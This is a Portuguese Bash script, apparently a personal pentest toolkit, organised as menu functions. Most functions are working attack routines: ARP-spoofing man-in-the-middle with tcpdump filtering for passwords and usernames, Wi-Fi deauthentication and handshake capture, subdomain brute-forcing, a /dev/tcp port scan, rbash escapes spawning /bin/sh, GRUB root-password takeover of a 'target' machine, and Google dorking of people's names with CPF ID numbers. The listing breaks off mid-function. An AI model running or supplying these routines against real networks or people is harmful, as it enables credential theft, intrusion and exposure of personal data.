# Define a função viii_recon_dns para realizar uma reconhecimento de DNS
function viii_recon_dns(){
    # Conta o total de linhas no arquivo de lista de subdomínios
    TOTAL_LINHAS=$(wc -l /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt|awk '{print $1}')
    
    echo "DNS recon"
    
    # Solicita ao usuário o endereço para o DNS RECON
    echo "Insira o endereço para o DNS RECON (EX: businesscorp.com.br)"
    read -r DOMAIN
    
    # Inicializa a contagem de linha
    linha=0
    
    # Itera sobre cada subdomínio na lista de subdomínios
    # shellcheck disable=SC2013
    for SUBDOMAIN in $(cat /usr/share/wordlists/amass/sorted_knock_dnsrecon_fierce_recon-ng.txt); do
        # shellcheck disable=SC2219
        let linha++ # Incrementa o contador de linha
        
        # Realiza uma pesquisa de DNS para o subdomínio atual e salva no arquivo dns_recon_$DOMAIN.txt
        host "$SUBDOMAIN"."$DOMAIN" >> dns_recon_"$DOMAIN".txt
        
        # Exibe o progresso da pesquisa
        echo "--------PESQUISANDO---------> $linha/$TOTAL_LINHAS"
    done 
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função ix_consulta_geral_google para realizar uma consulta geral no Google
function ix_consulta_geral_google(){
    echo "Consulta Geral Google" # Exibe mensagem indicando o início da consulta
    
    # Define as variáveis
    #FIREFOX_SEARCH="firefox &"
    LYNX_SEARCH="lynx -dump -hiddenlinks=merge -force_html"
    LISTA=./amanda2csv.csv
    
    # Define a função para aguardar a entrada do usuário
    function waitingUser() {
        read -r "Pressione Enter para continuar..."
    }
    
    # Define a função para realizar a consulta geral no Google
    function consulta_geral_google (){
        # Itera sobre cada linha no arquivo de lista de consultas
        while IFS= read -r LINHA; do
            local NOME
            NOME="$(echo "$LINHA" |awk -F, '{print $1}')" # Extrai o nome da linha
            local CPF
            CPF="$(echo "$LINHA" |awk -F, '{print $2}')"   # Extrai o CPF da linha
            
            # Exibe a mensagem indicando a pesquisa atual
            echo "==="
            echo "Pesquisando:""$NOME"+"$CPF"
            
            # Realiza a pesquisa no Google usando lynx e filtra os resultados
            $LYNX_SEARCH "https://www.google.com/search?q=intext:$NOME+intext:$CPF" | grep -i '\.pdf' | cut -d '=' -f2 | grep -v 'x-raw-image' | sed 's/...$//' | grep -E -i "(HTTPS|HTTP)"
            
            waitingUser # Aguarda o usuário pressionar Enter para continuar com a próxima pesquisa
        done < "$LISTA" # Redireciona o arquivo de lista de consultas para a entrada do loop
        echo "============ fim da consulta ===========" # Indica o fim da consulta
    }
    
    # Chama a função para realizar a consulta geral no Google
    consulta_geral_google
    
    # Aguarda o usuário pressionar Enter para continuar
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    
    main_menu; # Retorna ao menu principal
}
# Define a função x_mitm para realizar um ataque de Man-in-the-Middle (MiTM)
function x_mitm(){
    ########### VARIAVEIS ##############
    # Obtém o nome da interface de rede que começa com 'tap'.
    INTERFACE=$(ip -br a | grep tap | head -n 1 | cut -d ' ' -f1)
    # Calcula a rede da interface obtida anteriormente.
    REDE=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}'|awk -F '/' '{print $1}')"|grep -F "Network:"|awk '{print $2}')
    
    ########### FUNÇÕES ##############
    # Limpa a tela e exibe informações sobre a interface e a rede de ataque.
    function mensagem_inicial (){
        clear
        echo "============= 0.0wL ============="
        echo "INTERFACE DO ATAQUE: $INTERFACE"
        echo "REDE DO ATAQUE: $REDE"
        echo "================================="
    }
    
    # Habilita o roteamento de pacotes no sistema.
    function habilitar_roteamento_pc (){
        echo 1 > /proc/sys/net/ipv4/ip_forward
        echo "================================="
        echo "ROTEAMENTO DE PACOTES HABILITADO"
        echo "================================="
    }
    
    # Configura o ambiente para spoofing e captura de pacotes.
    function estrutura_mitm (){
        macchanger -r "$INTERFACE";  # Altera o endereço MAC da interface para fins de spoofing
        #wireshark -i "$INTERFACE" -k >/dev/null 2>&1 & # Inicia o Wireshark para captura de pacotes em segundo plano #TODO:REATIVAR WIRESHARK 
        tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $REDE" & \  # Inicia o Netdiscover em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 628:  : command not found
        sleep 10  # Espera por 10 segundos
        echo -n "Digite o IP do ALV01: "  # Solicita o IP do alvo 1
        read -r ALV01  # Lê o IP do alvo 1
        echo -n "Digite o IP do ALV02: "  # Solicita o IP do alvo 2
        read -r ALV02  # Lê o IP do alvo 2
        tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $ALV01 -r $ALV02" & \  # Inicia o Arpspoof em uma nova sessão do Tilix #FIXME: /media/kali/r3v4n64/CyberVault/EXTRAS/SCRIPTS/0wL_Cyber.sh: line 634:  : command not found
        #clear  # Limpa a tela
        #open a new konsole session with arpspoof
        tcpdump -i "$INTERFACE" -t host "$ALV01" and host "$ALV02" | grep -E '\[P.\]' | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' | tee capturas.txt #todo: add mais ext aos filtros com regex '  # Inicia o Tcpdump para captura de pacotes entre os alvos
    }
    
    # Função principal para execução do ataque MiTM
    function main_mitm (){
        mensagem_inicial;  # Chama a função mensagem_inicial.'
        habilitar_roteamento_pc;  # Chama a função habilitar_roteamento_pc.'
        estrutura_mitm;  # Chama a função estrutura_mitm.'
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
        read -r 2> /dev/null
        main_menu
    }
    
    ########### MAIN ##############
    main_mitm;

}
# Portscan usando bashsocket
function xi_portscan_bashsocket(){
    # Script retirado do livro Cybersecurity Ops with bash e modificado para as minhas necessidades
    #
    # Descrição:
    # Executa um portscan em um determinado host
    #

    echo -n "Insira o alvo para o portscan (ex: 192.168.9.5): "
    read -r host_alvo
    printf 'Alvo -> %s - Porta(s): ' "$host_alvo"  # Imprime o prefixo antes do loop

    # Usar uma variável para armazenar as portas encontradas
    portas_encontradas=""

    # Loop para verificar portas abertas
    for ((porta=1; porta<1024; porta++)); do
        cat >/dev/null 2>&1 < /dev/tcp/"${host_alvo}"/"${porta}"
        # shellcheck disable=SC2181
        if (($? == 0)); then 
            portas_encontradas+=" $porta"  # Adiciona a porta à lista de portas encontradas
        fi
    done 

    # Imprime a lista de portas encontradas
    echo "Portas abertas em $host_alvo: $portas_encontradas"
    echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
    read -r 2> /dev/null
    main_menu;
}
# Define a função xii_comandos_uteis_linux para explicar sobre comandos úteis no linux
function xii_comandos_uteis_linux(){
  # limpa a tela
  clear

  # exibe um cabeçalho
  echo
  echo ">>>>>>>>>> COMANDOS LINUX <<<<<<<<<<"
  echo

  # exibe uma seção com comandos para gerenciamento de rede
  echo -e "${RED}# Comandos uteis na gerencia de redes${RESET}"
  echo

  # exibe a sintaxe básica para os comandos
  echo "Sintaxe -> comando (suite)"
  echo

  ### Listar tabela ARP

  # exibe a seção para o comando arp
  echo -e "${RED}## Listar tabela ARP${RESET}"
  echo

  # mostra como usar o comando arp (Net-tools & IP route) para listar a tabela ARP
  echo "arp -a (Net-tools & IP route)"
  echo

  ### Exibir IPs configurados

  # exibe a seção para os comandos ifconfig e ip addr
  echo -e "${RED}## Exibir Ips configurados${RESET}"
  echo

  # mostra como usar o comando ifconfig (Net-tools) para exibir IPs configurados
  echo "ifconfig -a (Net-tools)"

  # mostra como usar o comando ip addr (IP route) para exibir IPs configurados
  echo "ip addr (IP route)"
  echo

  ### Ativar/Desativar uma interface

  # exibe a seção para os comandos ifconfig e ip link
  echo -e "${RED}## Ativar/Desativar uma interface${RESET}"
  echo

  # mostra como usar o comando ifconfig eth0 up/down (Net-tools) para ativar/desativar a interface eth0
  echo "ifconfig eth0 up/down (Net-tools)"

  # mostra como usar o comando ip link set eth0 up/down (IP route) para ativar/desativar a interface eth0
  echo "ip link set eth0 up/down (IP route)"

  # observação sobre a interface eth0
  echo -e "${GRAY}ps: eth0 refere-se a sua interface de rede. Para saber qual as suas interfaces, execute um dos comandos em 'Exibir Ips configurados'${RESET}"
  echo

  ### Exibir conexões ativas

  # exibe a seção para os comandos netstat e ss
  echo -e "${RED}## Exibe conexões ativas${RESET}"
  echo

  # mostra como usar o comando netstat (Net-tools) para exibir conexões ativas
  echo "netstat (Net-tools)"

  # mostra como usar o comando ss (IP route) para exibir conexões ativas
  echo "ss (IP route)"

  # observação sobre o comando ss para detectar shells indesejadas
  echo -e "${GRAY}ps: para (talvez) saber se o chineizinho tem uma shell no seu computador, execute o comando 'ss -lntp'${RESET}"
  echo

  ### Exibir Rotas

  # exibe a seção para os comandos route e ip route
  echo -e "${RED}## Exibe Rotas${RESET}"
  echo

  # mostra como usar o comando route (Net-tools) para exibir rotas
  echo "route (Net-tools)"

  # mostra como usar o comando ip route (IP route) para exibir rotas
  echo "ip route (IP route)"
  echo

  # exibe uma seção com informações sobre configurações de placa de rede
  echo -e "${RED}# Configurações de Placa de Rede${RESET}"
  echo

  ### Configurações de rede em Debian

  # explica como configurar a rede de forma persistente em sistemas derivados do Debian
  echo -e "Nos sistemas derivados do ${RED}Debian${RESET}, a configuração persistente de rede é feita no arquivo ${RED}/etc/network/interfaces${RESET}"
  echo

  ### Configurações de rede em Red Hat Linux

  # explica como configurar a rede de forma persistente em sistemas derivados do Red Hat Linux
  echo -e "Nos sistemas derivados do ${RED}Red Hat Linux${RESET}, a configuração persistente de rede é configurada nos arquivos encontrados no diretório ${RED}/etc/sysconfig/network-scripts${RESET}"
  echo

  # pausa o script até que o usuário pressione ENTER
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # chama a função main_menu para retornar ao menu principal
  main_menu;
}
# Define a função xiii_exemplos_find para explicar sobre o comando find
function xiii_exemplos_find(){
  # limpa a tela
  clear

  # exibe um cabeçalho
  echo
  echo ">>>>>>>>>> COMANDOS LINUX - FIND & SEUS EXEMPLOS <<<<<<<<<<"
  echo

  ### Listar todos os arquivos em um diretório

  # exibe a descrição e o comando para listar todos os arquivos em um diretório
  echo -e "${RED}# exibe uma lista com todos os arquivos localizados em um determinado diretório, incluindo os arquivos armazenados nos subdiretórios.${RESET}"
  echo -e "$ find ."
  echo

  ### Buscar por arquivos com maxdepth

  # exibe a descrição e o comando para buscar por arquivos com um nível máximo de subdiretórios (maxdepth)
  echo -e "${RED}# Condição que define o nível de 'profundidade' na navegação dos subdiretórios por meio do maxdepth.${RESET}"
  echo -e "$ find /etc -maxdepth 1 -name *.sh"
  echo

  ### Buscar por arquivos com nome específico

  # exibe a descrição e o comando para buscar por arquivos com nome específico usando curingas
  echo -e "${RED}# Pesquisa por arquivos${RESET}"
  echo -e "$ find ./test -type f -name <arquivo*>"
  echo

  ### Buscar por diretórios com nome específico

  # exibe a descrição e o comando para buscar por diretórios com nome específico usando curingas
  echo -e "${RED}# Pesquisa por diretórios${RESET}"
  echo -e "$ find ./test -type d -name <diretorio*>"
  echo

  ### Buscar por arquivos ocultos

  # exibe a descrição e o comando para buscar por arquivos ocultos
  echo -e "${RED}# Pesquisa por arquivos ocultos${RESET}"
  echo -e "$ find ~ -type f -name ".*""
  echo

  ### Buscar por arquivos com permissões específicas

  # exibe a descrição e o comando para buscar por arquivos com permissões específicas
  echo -e "${RED}# Pesquisa por arquivos com determinadas permissões${RESET}"
  echo -e "# find / -type f -perm 0740 -type f -exec ls -la {} 2>/dev/null \;"
  echo
  echo -e "${RED}# Pesquisa por arquivos com permissões SUID${RESET}"
  echo -e "# find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;"
  echo


  ### Buscar por arquivos do usuário específico

  # exibe a descrição e o comando para buscar por arquivos do usuário específico
  echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin${RESET}"
  echo -e "$ find . –user msfadmin"
  echo

  ### Buscar por arquivos do usuário específico com extensão específica

  # exibe a descrição e o comando para buscar por arquivos do usuário específico com extensão específica
  echo -e "${RED}# Pesquisa por arquivos do usuário msfadmin de extensão .txt${RESET}"
  echo -e "$ find . –user msfadmin –name ‘*.txt’"
  echo

  ### Buscar por arquivos do grupo específico

  # exibe a descrição e o comando para buscar por arquivos do grupo específico
  echo -e "${RED}# Pesquisa por arquivos do grupo adm${RESET}"
  echo -e "# find . –group adm"
  echo

  ### Buscar por arquivos modificados há N dias

  # exibe a descrição e o comando para buscar por arquivos modificados há N dias
  echo -e "${RED}# Pesquisa por arquivos modificados a N dias${RESET}"
  echo -e "find / -mtime 5"
  echo

  ### Buscar por arquivos acessados há N dias

  # exibe a descrição e o comando para buscar por arquivos acessados há N dias
  echo -e "${RED}# Pesquisa por arquivos acessados a N dias${RESET}"
  echo -e "# find / -atime 5"
  echo

  ### Buscar e executar comando com arquivos encontrados

  # exibe a descrição e o comando para buscar por arquivos e executar um comando com cada um deles
  echo -e "${RED}# Realiza a busca e executa comando com entradas encontradas.${RESET}"
  echo -e "# find / -name "*.pdf" -type f -exec ls -lah {} \;"
  echo

  # pausa o script até que o usuário pressione ENTER
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # chama a função main_menu para retornar ao menu principal
  main_menu;
}
# Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no debian
function xiv_debian_memento_troca_senha_root(){
  # limpa a tela
  clear

  # exibe um cabeçalho informativo
  echo
  echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Debian e derivados ###${RESET}"
  echo

  ### Passo 1: Reiniciar o computador

  # instrui o usuário a reiniciar o computador alvo
  echo -e " 1. ${RED}Reiniciar o computador alvo;${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 2: Editar o menu do GRUB

  # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
  echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 3: Localizar e modificar a linha de comando

  # instrui o usuário a localizar a linha que inicia com "linux boot..." e substituir "ro quiet" por "init=/bin/bash rw"
  echo -e " 3. Procurar pela linha que inicia com ${RED}'linux boot…${RESET}', substituir ${RED}'ro quiet${RESET}' ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 4: Salvar as alterações e inicializar o sistema

  # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
  echo -e " 4. Pressione ${RED}'Ctrl+x'${RESET} para iniciar o sistema com os parâmetros alterados;"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 5: Definir a nova senha de root

  # instrui o usuário a definir a nova senha de root após o sistema inicializar
  echo -e " 5. Após a inicialização do sistema, execute ${RED}'passwd root'${RESET} e digite a nova senha."

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 6: Reinicializar o sistema

  # instrui o usuário a reinicializar o sistema após definir a nova senha
  echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'reboot -f'${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Mensagem de confirmação

  # exibe uma mensagem informando que a senha do root foi redefinida
  echo
  echo -e "${RED}### NESSE MOMENTO, SE DEU TUDO CERTO, VOCÊ POSSUI A SENHA DO ROOT USER ###${RESET}"
  echo

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # volta para o menu principal
  main_menu;
}
# Define a função xiv_debian_memento_troca_senha_root para explicar sobre a troca de senha root no redhat
function xv_redhat_memento_troca_senha_root(){
  # limpa a tela
  clear

  # exibe um cabeçalho informativo
  echo
  echo -e "${RED}### Redefinindo a senha de root em sistemas Operacionais Red Hat e derivados ###${RESET}"
  echo

  ### Passo 1: Reiniciar o computador

  # instrui o usuário a reiniciar o computador alvo
  echo -e " 1. ${RED}Reiniciar o computador alvo${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 2: Editar o menu do GRUB

  # instrui o usuário a entrar no menu de edição do GRUB pressionando a tecla 'e'
  echo -e " 2. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 3: Localizar e modificar a linha de comando no CentOS/Fedora

  # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en_US.UTF-8" por "init=/bin/bash rw" (para CentOS/Fedora)
  echo -e " 3. Procurar pela linha que inicia com ${RED}'linux16...'${RESET}, substituir ${RED}'rghb quiet LANG=en_US.UTF-8${RESET} ao final dessa linha por ${RED}'init=/bin/bash rw'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 4: Salvar as alterações e inicializar o sistema

  # instrui o usuário a salvar as alterações pressionando "Ctrl+x" e inicializar o sistema com os novos parâmetros
  echo -e " 4. Pressione ${RED}'Ctrl\+x'${RESET} para iniciar o sistema com os parâmetros alterados;"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 5: Desabilitar o SELinux (somente CentOS/Fedora)

  # informa ao usuário que o SELinux precisa ser desabilitado (apenas para CentOS/Fedora)
  echo -e " 5. Após a inicialização do sistema, temos que desabilitar o SELinux. Para isso, edite o arquivo ${RED}'/etc/selinux/config'${RESET} e substitua a opção ${RED}'enforcing'${RESET} por ${RED}'disable'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 6: Reinicializar o sistema (somente CentOS/Fedora)

  # instrui o usuário a reinicializar o sistema após desabilitar o SELinux (apenas para CentOS/Fedora)
  echo -e " 6. Reinicialize o SO, utilize o comando: ${RED}'/sbin/halt –reboot \-f'${RESET}"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 7: Editar o menu do GRUB novamente (somente Rocky/Alma)

  # informa ao usuário que o menu do GRUB precisa ser editado novamente (apenas para Rocky/Alma)
  echo -e " 7. Editar o menu do grub pressionando a tecla ${RED}'e'${RESET};"

  # pausa o script até que o usuário pressione ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  ### Passo 8: Localizar e modificar a linha de comando no Rocky/Alma

  # instrui o usuário a localizar a linha que inicia com "linux16..." e substituir "rghb quiet LANG=en
}
# Definição da função xvi_vim_memento
function xvi_vim_memento(){
  # Limpa a tela
  clear

  # Exibe cabeçalho do lembrete de uso do Vim
  echo -e "${GREEN}============= LEMBRETE DE USO DO VIM =============${RESET}"
  echo

  # **Inserção de texto**
  echo -e "${YELLOW}Inserção de texto:${RESET}"
  echo -e "Pressione 'i' para entrar no modo de inserção."

  # **Salvar e sair**
  echo -e "\n${YELLOW}Salvar e sair:${RESET}"
  echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':wq' para salvar e sair."

  # **Sair sem salvar**
  echo -e "\n${YELLOW}Sair sem salvar:${RESET}"
  echo -e "Pressione 'Esc' para sair do modo de inserção, então digite ':q!' para sair sem salvar."

  # **Movimentação pelo texto**
  echo -e "\n${YELLOW}Movimentação pelo texto:${RESET}"
  echo -e "Use as teclas de seta ou as teclas 'h', 'j', 'k' e 'l' para mover o cursor."

  # **Excluir texto**
  echo -e "\n${YELLOW}Excluir texto:${RESET}"
  echo -e "Pressione 'x' para excluir o caractere sob o cursor."

  # **Desfazer e refazer**
  echo -e "\n${YELLOW}Desfazer e Refazer:${RESET}"
  echo -e "Pressione 'u' para desfazer e 'Ctrl + r' para refazer."

  # **Buscar e substituir**
  echo -e "\n${YELLOW}Buscar e Substituir:${RESET}"
  echo -e "Digite '/' para iniciar a busca. Para substituir, use ':s/palavra/nova_palavra/g'."

  # **Ajuda**
  echo -e "\n${YELLOW}Ajuda:${RESET}"
  echo -e "Digite ':help' para obter ajuda."

  # Exibe rodapé do lembrete de uso do Vim
  echo -e "\n${GREEN}===================================================${RESET}"
  echo

  # Mensagem para pressionar ENTER para continuar
  echo -e "${GRAY} Pressione ENTER para continuar${RESET}"
  read -r 2> /dev/null

  # Chamada da função principal do menu principal após pressionar ENTER
  main_menu;
}
# Definição da função principal xvii_tec_esc_rbash
function xvii_tec_esc_rbash(){

    # Definição da função vim_escape_rbash
    function vim_escape_rbash(){
        # Comando do Vim para escapar do rbash
        local vim_comando="vim.tiny -E -c :\!/bin/sh"

        # Verificar se o konsole está instalado
        if command -v konsole &> /dev/null; then
                # KDE (Konsole)
                konsole --hold -e "${vim_comando}"
        else
            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
            if command -v gnome-terminal &> /dev/null; then
                # Ubuntu (Gnome Terminal)
                gnome-terminal -- "${vim_comando}"
            elif command -v xfce4-terminal &> /dev/null; then
                # Xubuntu (Xfce Terminal)
                xfce4-terminal --execute "${vim_comando}"
            elif command -v tilix &> /dev/null; then
                # Tilix está instalado
                tilix --action=app-new-window "${vim_comando}"
            elif command -v xterm &> /dev/null; then
                # Terminal genérico (xterm)
                xterm -e "${vim_comando}"
            else
                # Nenhum terminal padrão encontrado
                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                exit 1
            fi
        fi
    }

    # Definição da função find_escape_rbash
    function find_escape_rbash(){
        # Comando find para escapar do rbash
        local find_comando="find . -exec /bin/sh \; -quit"

        # Verificar se o Tilix está instalado
        if command -v tilix &> /dev/null; then
            # Tilix está instalado, abrir uma nova sessão do Tilix
            tilix --action=app-new-window "${find_comando}"
        else
            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
            if command -v gnome-terminal &> /dev/null; then
                # Ubuntu (Gnome Terminal)
                gnome-terminal -- "${find_comando}"
            elif command -v xfce4-terminal &> /dev/null; then
                # Xubuntu (Xfce Terminal)
                xfce4-terminal --execute "${find_comando}"
            elif command -v konsole &> /dev/null; then
                # KDE (Konsole)
                konsole --hold -e "${find_comando}"
            elif command -v xterm &> /dev/null; then
                # Terminal genérico (xterm)
                xterm -e "${find_comando}"
            else
                # Nenhum terminal padrão encontrado
                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                exit 1
            fi
        fi
    }

    # Definição da função man_escape_rbash
    function man_escape_rbash(){
        # Comando man para escapar do rbash
        local man_comando="echo 'Para escapar do rbash, logo apos o man iniciar, digite \!sh. Para continuar, aperte enter' && read && man man"

        # Verificar se o Tilix está instalado
        if command -v tilix &> /dev/null; then
            # Tilix está instalado, abrir uma nova sessão do Tilix
            tilix --action=app-new-window "${man_comando}"
        else
            # Tilix não está instalado, verificar a distribuição Linux e abrir um terminal padrão
            if command -v gnome-terminal &> /dev/null; then
                # Ubuntu (Gnome Terminal)
                gnome-terminal -- "${man_comando}"
            elif command -v xfce4-terminal &> /dev/null; then
                # Xubuntu (Xfce Terminal)
                xfce4-terminal --execute "${man_comando}"
            elif command -v konsole &> /dev/null; then
                # KDE (Konsole)
                konsole --hold -e "${man_comando}"
            elif command -v xterm &> /dev/null; then
                # Terminal genérico (xterm)
                xterm -e "${man_comando}"
            else
                # Nenhum terminal padrão encontrado
                echo "Nenhum terminal padrão encontrado. Este script não pode escapar do rbash."
                exit 1
            fi
        fi
    }

    # Definição da função verifica_comandos_instalados
    function verifica_comandos_instalados () {
        # Verificar se o Vim está instalado e acessível
        if command -v vim &> /dev/null; then
            # Executar função para escapar do rbash com Vim
            vim_escape_rbash;
        else
            # Verificar se o Find está instalado e acessível
            if command -v find &> /dev/null; then
                # Executar função para escapar do rbash com Find
                find_escape_rbash;
            # Verificar se o Man está instalado e acessível
            elif command -v man &> /dev/null; then
                # Executar função para escapar do rbash com Man
                man_escape_rbash;
            else
                # Nenhum dos comandos necessários está instalado
                echo "O script não é capaz de sair do rbash"    
            fi
        fi   
    }

    # Definição da função principal main_tec_esc_rbash
    function main_tec_esc_rbash(){
        # Chamar função para verificar comandos instalados e escapar do rbash
        verifica_comandos_instalados;
        pausa_script;
    }

    # Chamar função principal
    main_tec_esc_rbash

}
# Este script realiza testes de penetração em redes wireless
function xviii_wifi_atk(){
    ##############################################################
    #
    #           Wireless Pentest 
    #
    #           AUTOR: Z1GSN1FF3R||R3v4N||0wL 
    #
    #           DATA: 01-27-2021
    #           REFATORADO: 04-22-2024    
    #   
    #           DESCRIÇÃO: Este script realiza testes de penetração em redes wireless.
    #
    #
    ##############################################################
     
    # Função para executar configurações preliminares antes do ataque
    function pre_configuracoes(){
        # **Descrição:** Desliga a interface 'mon0' do modo monitor.

        airmon-ng stop mon0

        # **Explicação:**

        # O comando `airmon-ng stop mon0` desativa a interface 'mon0' do modo monitor. 
        # Isso é necessário para que a interface possa ser usada para outras finalidades, como se conectar a uma rede Wi-Fi.
        # É importante notar que este comando pode falhar se a interface 'mon0' não estiver ativa no modo monitor.

        # **Observações:**

        # Certifique-se de que a interface 'mon0' esteja ativa no modo monitor antes de executar este comando.
        # Se o comando falhar, tente verificar o status da interface com o comando `airmon-ng check`.
    }

    # Função para mostrar as interfaces wireless disponíveis e configurar a interface para o modo monitor
    function interfaces_disponiveis(){
        clear
        #if #TODO: ADC UMA CHECAGEM IF AQUI PARA VERIFICAR A INTERFACE WIFI
        #echo ""
        #echo "=========== IW DISPONIVEIS ============="
        #airmon-ng
        #echo "=========== MONITOR MODE ============="
        #read -p "Interface Wireless para entrar em modo monitor: " INTERFACE
        #echo "======================================"
        #echo ""
    }        

    # Função para realizar as configurações iniciais, como desativar a interface, configurar o modo monitor e alterar o endereço MAC
    function configuracoes_iniciais(){
        # Desativa a interface de rede
        ifconfig "${INTERFACE}" down

        # Adiciona uma nova interface em modo monitor chamada mon0
        iw dev "${INTERFACE}" interface add mon0 type monitor

        # Altera o endereço MAC da interface mon0
        macchanger -r mon0

        # Verifica se há processos em execução que podem interferir e os encerra
        airmon-ng check kill #kill the process that maybe cause some problem

        # Solicita ao usuário para pressionar ENTER para continuar
        echo -e "${GRAY} Pressione ENTER para continuar${RESET}" && read -r 2> /dev/null
    }

    # Função para iniciar o monitoramento em modo promíscuo
    function monitoramento_promiscuo(){
        # Obtém o timestamp atual para nomear o arquivo de log
        local timestamp
        timestamp=$(date +"%d%H%M%b%y")    

        # Executa o comando airodump-ng para iniciar o monitoramento em modo promíscuo e escrever os resultados em um arquivo de log com o timestamp no nome
        airodump-ng mon0 --write monitoramento_promiscuo_log"$timestamp"
    }

    # Função para escanear o Access Point (AP) alvo e escrever os resultados em um arquivo de log
    function scan_ap_alvo(){    
        echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal
        echo "============================================"

        # Solicita ao usuário o BSSID (MAC do AP) do alvo
        read -r -p "BSSID (MAC do AP) do alvo: " MACTARGET

        # Solicita ao usuário o canal do AP
        read -r -p "Canal do AP: " CHANNEL #TODO: ADC TRATAMENTO PARA FILTRAR O CANAL DO AP LOGO APÓS A INSERÇÃO DO BSSID

        echo "============================================"
        echo "" # Imprime uma linha em branco para melhorar a apresentação no terminal

        # Executa o comando airodump-ng para escanear o AP alvo, utilizando o BSSID e o canal fornecidos pelo usuário, e escreve os resultados em um arquivo de log
        airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write scan_ap_alvo_log
    }

    # Função para capturar o handshake de autenticação entre o cliente e o AP alvo
    function captura_4whsk(){
        # Abre uma nova sessão do Tilix e executa o comando airodump-ng para capturar o handshake de autenticação entre o cliente e o AP alvo.
        # Os resultados são escritos em um arquivo de log chamado captura_4whsk_log.
        # O redirecionamento "> /dev/null 2>&1" é utilizado para suprimir a saída padrão e de erro do comando, e o processo é executado em segundo plano "&".
        tilix --action=app-new-window -e airodump-ng mon0 --bssid "$MACTARGET" -c "$CHANNEL" --write captura_4whsk_log > /dev/null 2>&1 &
    }

    # Função para realizar um ataque de desautenticação (deauth) no cliente especificado
    function ataque_deauth(){  
        echo ""
        echo "============================================"
        read -r -p "MAC do cliente para ser desconectado: " CLNTMAC
        echo "============================================"
        echo ""
        # Deauth no cliente
        for ((i=1;i<=3;i++)); do
            # Executa o comando aireplay-ng para realizar o ataque de desautenticação.
            # A opção "--deauth=5" indica o número de pacotes de desautenticação a serem enviados.
            # Os parâmetros "-a" e "-c" especificam o endereço MAC do AP alvo e do cliente, respectivamente.
            # A saída do comando é salva em um arquivo de log chamado ataque_deauth.log, utilizando o comando "tee -a".
            aireplay-ng --deauth=5 -a "$MACTARGET" -c "$CLNTMAC" mon0 | tee -a ataque_deauth.log
            # Mensagem para informar o intervalo entre os ataques de desautenticação
            echo "Intervalo de 5s entre um ataque e outro de Deauth. Aperte Ctrl+C para cancelar após a captura do 4-way-handshake"
            if [ $i -lt 3 ]; then #TODO:VERIFICAR NECESSIDADE DESSE IF
